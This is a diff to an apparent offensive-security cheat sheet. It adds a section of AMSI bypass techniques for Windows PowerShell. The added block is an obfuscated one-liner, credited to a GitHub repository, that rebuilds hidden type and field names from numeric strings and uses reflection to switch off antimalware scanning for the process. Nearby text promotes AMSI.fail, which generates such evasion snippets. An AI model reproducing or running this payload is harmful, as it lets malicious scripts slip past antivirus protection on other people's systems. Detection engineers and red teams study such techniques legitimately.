@@ -759,6 +759,15 @@ Add-Type -TypeDefinition $Winpatch -Language CSharp
 [patch]::it()
 ```
 
+## Other interesting AMSI bypass
+
+* [tihanyin/PSSW100AVB/AMSI_bypass_2021_09.ps1](https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1)
+    ```ps1
+    $A="5492868772801748688168747280728187173688878280688776828"
+    $B="1173680867656877679866880867644817687416876797271"
+    [Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " " ).GetField([string](38..51|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " ",'Non' + 'Public,Static').SetValue($null,$true)
+    ```
+
 ## AMSI.fail
 
 > AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures. - https://amsi.fail/
